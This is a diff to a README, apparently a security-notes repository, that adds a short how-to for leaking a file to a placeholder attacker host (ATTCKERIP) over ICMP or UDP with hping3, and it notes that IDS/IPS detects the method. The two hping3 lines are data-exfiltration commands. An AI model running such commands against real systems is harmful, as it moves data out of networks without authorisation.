@@ -3,6 +3,22 @@ SKF is a fully open-source Python-Flask web-application that uses the OWASP Appl
 
 https://securityknowledgeframework.org/demo.php
 
+
+## Send file through hping3 (Data leak)
+1- check the file size using `ls -la`
+
+2.a - To send the file as an **icmp** using hping3 command
+
+`sudo hping3 ATTCKERIP --icmp -d FILESIZE -c 1 --file FILENAME`
+
+2.b - To send the file as a **UDP** using hping3 command
+
+`sudo hping3 ATTCKERIP --udp -d FILESIZE -c 1 --file FILENAME`
+
+3 - (Optional) On the attacker machine you might disable replying icmp using iptables
+
+**NOTE: This attack is simply detected using IDS/IPS**
+
 ## Suggester:
 A simple code for Checking your local host system for available exploites
 
